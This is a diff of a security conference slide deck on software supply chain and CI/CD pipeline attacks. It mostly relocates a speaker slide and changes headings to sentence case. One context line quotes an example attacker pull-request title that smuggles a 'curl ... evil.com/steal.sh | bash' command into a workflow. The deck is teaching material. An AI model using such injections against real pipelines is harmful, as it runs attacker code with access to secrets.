@@ -181,78 +181,6 @@ section {
 ---
 
 <!-- ====================================================================== -->
-<!-- SPEAKER INTRO -->
-<!-- ====================================================================== -->
-
-<style scoped>
-section {
-  background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #1e1b4b 100%);
-}
-.speaker-container {
-  display: flex;
-  align-items: center;
-  gap: 3rem;
-  height: 80%;
-}
-.speaker-photo {
-  width: 280px;
-  height: 280px;
-  object-fit: cover;
-  border-radius: 50%;
-  box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4), 0 0 60px rgba(59, 130, 246, 0.3);
-  border: 4px solid rgba(59, 130, 246, 0.3);
-}
-.speaker-name {
-  font-size: 2.8em;
-  font-weight: bold;
-  background: linear-gradient(135deg, #93c5fd 0%, #60a5fa 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  margin-bottom: 0.3em;
-}
-.speaker-role {
-  font-size: 1.3em;
-  background: linear-gradient(90deg, #fbbf24 0%, #f59e0b 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  margin-bottom: 1em;
-}
-.talk-title {
-  font-size: 1.1em;
-  color: #e2e8f0;
-  line-height: 1.5;
-}
-.talk-title strong {
-  background: linear-gradient(90deg, #f97316 0%, #ec4899 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-}
-.conf {
-  position: absolute;
-  bottom: 40px;
-  right: 60px;
-  color: #06b6d4;
-  font-weight: 600;
-}
-</style>
-
-<div class="speaker-container">
-  <img src="assets/img/niek.jpg" class="speaker-photo" alt="Niek Palm" />
-  <div>
-    <div class="speaker-name">Niek Palm</div>
-    <div class="speaker-role">Security Architect</div>
-    <div class="talk-title">
-      <strong>Supply Chain Compromised</strong><br>
-      Dissecting the Anatomy of Modern Pipeline Attacks
-    </div>
-  </div>
-</div>
-
-<div class="conf">BSides Groningen '26</div>
-
----
-
-<!-- ====================================================================== -->
 <!-- THE EXPLOIT VIDEO -->
 <!-- ====================================================================== -->
 
@@ -300,6 +228,54 @@ The CI/CD pipeline ran the attacker's code with full access to secrets.
 # Attacker's PR title: "; curl https://evil.com/steal.sh | bash #
 ```
 
+</div>
+
+---
+
+<!-- Speaker intro (after demo) -->
+
+<style scoped>
+section {
+  background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #1e1b4b 100%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.speaker-container {
+  display: flex;
+  align-items: center;
+  gap: 2.5rem;
+}
+.speaker-photo {
+  width: 240px;
+  height: 240px;
+  object-fit: cover;
+  border-radius: 50%;
+  box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4), 0 0 60px rgba(59, 130, 246, 0.3);
+  border: 4px solid rgba(59, 130, 246, 0.3);
+}
+.speaker-name {
+  font-size: 2.8em;
+  font-weight: bold;
+  background: linear-gradient(135deg, #93c5fd 0%, #60a5fa 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  margin-bottom: 0.2em;
+}
+.speaker-role {
+  font-size: 1.3em;
+  background: linear-gradient(90deg, #fbbf24 0%, #f59e0b 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+</style>
+
+<div class="speaker-container">
+  <img src="assets/img/niek.jpg" class="speaker-photo" alt="Niek Palm" />
+  <div>
+    <div class="speaker-name">Niek Palm</div>
+    <div class="speaker-role">Security Architect</div>
+  </div>
 </div>
 
 ---
@@ -360,7 +336,7 @@ h1 {
 
 <div class="section-num">Part 1</div>
 
-# The Software Supply Chain
+# The software supply chain
 
 <div class="sub">Understanding what we're protecting</div>
 
@@ -505,7 +481,7 @@ h2 { font-size: 1em; color: #fbbf24; text-align: center; margin-bottom: 0.8em; }
 .example-item strong { color: #94a3b8; }
 </style>
 
-# Your Code's Journey
+# Your code's journey
 
 ## From idea to user
 
@@ -860,17 +836,6 @@ h1 {
 
 ---
 
-<!-- The question -->
-
-<style scoped>
-section { justify-content: center; text-align: center; }
-h1 { font-size: 2.5em; }
-</style>
-
-# How many dependencies does your app have?
-
----
-
 <!-- The reveal -->
 
 <style scoped>
@@ -999,7 +964,7 @@ h1 { font-size: 2.2em; margin-bottom: 1em; }
 }
 </style>
 
-# Your Code is Mostly Not Yours
+# Your code is mostly not yours
 
 <div class="stats">
 <div class="stat-box">
@@ -1099,7 +1064,7 @@ h1 { font-size: 2.2em; margin-bottom: 1em; }
 }
 </style>
 
-# The Standard CI/CD for Open Source
+# The standard CI/CD for open source
 
 <div class="stats">
 <div class="stat-box">
@@ -1152,7 +1117,7 @@ pre { font-size: 0.58em; }
 }
 </style>
 
-# Workflow Anatomy
+# Workflow anatomy
 
 <div class="split">
 
@@ -1222,7 +1187,7 @@ h1 { font-size: 2.2em; margin-bottom: 1em; text-align: center; }
 }
 </style>
 
-# Why Attackers Love GitHub Actions
+# Why attackers love GitHub Actions
 
 <div class="reasons">
 <div class="reason">
@@ -1355,7 +1320,7 @@ p { font-size: 0.8em; margin: 0.5em 0; }
 pre { font-size: 0.6em; margin: 0.8em 0; }
 </style>
 
-# Step 1: NPM Preinstall Hook
+# Step 1: npm preinstall hook
 
 ## Using the system against itself
 
@@ -1405,7 +1370,7 @@ code { font-size: 0.8em; }
 .irony { color: #f87171; font-style: italic; font-size: 0.75em; margin-top: 0.8em; text-align: center; }
 </style>
 
-# Step 2: Secret Hunting
+# Step 2: Secret hunting
 
 ## Every trick in the book - including security tools
 
@@ -1469,7 +1434,7 @@ h2 { font-size: 1em; color: #22c55e; margin-bottom: 1em; }
 .stat-box .lbl { font-size: 0.85em; color: #fde68a; }
 </style>
 
-# Step 3: Worm Propagation
+# Step 3: Worm propagation
 
 ## If NPM token found + victim is npm package → spread
 
@@ -1542,13 +1507,13 @@ h2 { font-size: 0.8em; color: #ef4444; margin-bottom: 0.6em; }
 ![bg left:38%](assets/img/sh-step-5.png)
 
 <style scoped>
-h1 { font-size: 1.6em; margin-bottom: 0.2em; }
+h1 { font-size: 1.4em; margin-bottom: 0.2em; }
 h2 { font-size: 0.8em; color: #a855f7; margin-bottom: 0.6em; }
 .exfil-method {
   background: rgba(168, 85, 247, 0.1);
   border-left: 3px solid #a855f7;
   padding: 10px 14px;
-  margin: 8px 0;
+  margin: 12px 0;
   border-radius: 0 8px 8px 0;
 }
 .exfil-method h3 { color: #c084fc; margin: 0 0 4px 0; font-size: 0.8em; }
@@ -1609,7 +1574,7 @@ h2 { font-size: 0.8em; color: #dc2626; margin-bottom: 0.6em; }
 .method p { margin: 0; font-size: 0.65em; color: #94a3b8; margin-top: 5px; }
 </style>
 
-# Step 6: Kill Switch
+# Step 6: Kill switch
 
 ## If exfiltration fails - destroy everything
 
@@ -1635,7 +1600,7 @@ h2 { font-size: 0.8em; color: #dc2626; margin-bottom: 0.6em; }
 
 <!-- Shai-Hulud: The Full Kill Chain Summary -->
 
-![bg left:45% contain](assets/img/shai-hulud-2-gitguardian.png)
+![bg left:50% contain](assets/img/shai-hulud-2-gitguardian.png)
 
 <style scoped>
 h1 { font-size: 1.6em; margin-bottom: 0.05em;
@@ -1652,15 +1617,15 @@ h2 { font-size: 0.7em; color: #a16207; margin-bottom: 0.4em; }
   font-weight: 700; font-size: 0.55em; flex-shrink: 0; }
 .step .txt { font-size: 0.58em; color: #fde68a; }
 .step .txt strong { color: #fbbf24; }
-.stats-row { display: flex; gap: 6px; margin-bottom: 0.3em; flex-wrap: wrap; }
+.stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-bottom: 0.3em; }
 .pill { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3);
-  border-radius: 12px; padding: 3px 10px; text-align: center; }
+  border-radius: 12px; padding: 4px 10px; text-align: center; }
 .pill .val { font-size: 1em; font-weight: 800; color: #fbbf24; }
 .pill .lbl { font-size: 0.5em; color: #fca5a5; }
 .takeaway { font-size: 0.6em; color: #fde68a; font-style: italic; }
 </style>
 
-# The Full Kill Chain
+# The full kill chain
 
 ## One npm install → total compromise in minutes
 
@@ -1774,7 +1739,7 @@ h2 { font-size: 0.85em; color: #a78bfa; margin-bottom: 0.8em; }
 .outcome strong { color: #a78bfa; }
 </style>
 
-# Repos Compromised
+# Repos compromised
 
 ## All exploited known `pull_request_target` misconfigurations
 
@@ -1845,7 +1810,7 @@ h1 {
 }
 </style>
 
-# Tag Hijacking
+# Tag hijacking
 
 <div class="sub">tj-actions (2025) → Trivy (2026) - Same mistake</div>
 <div class="badge">ONE YEAR APART - SAME VULNERABILITY</div>
@@ -1932,7 +1897,7 @@ h1 { font-size: 2em; margin-bottom: 1em; }
 pre { font-size: 0.6em; }
 </style>
 
-# Tags Lie. SHAs Don't.
+# Tags lie. SHAs don't.
 
 <div class="compare">
 <div class="side bad">
@@ -2060,7 +2025,7 @@ img {
 .note strong { color: #fbbf24; }
 </style>
 
-# The 3-Hour Window
+# The 3-hour window
 
 <div class="subtitle">100M downloads/week → <strong>~2M downloads in just 3 hours</strong></div>
 
@@ -2145,7 +2110,7 @@ h1 {
 .attr strong { color: #fbbf24; }
 </style>
 
-# How One Teams Call Compromised 2M Installs
+# How one Teams call compromised 2M installs
 
 <div class="layout">
 <div class="left-col">
@@ -2215,7 +2180,7 @@ h1 {
 
 <div class="section-num">Part 5</div>
 
-# AI in the Supply Chain
+# AI in the supply chain
 
 <div class="sub">Producer, consumer, and attack surface</div>
 
@@ -3180,7 +3145,7 @@ h1 {
 
 <div class="section-num">Part 6 - Defenses</div>
 
-# Breaking the Chain
+# Breaking the chain
 
 <div class="sub">Practical defenses that work</div>
 
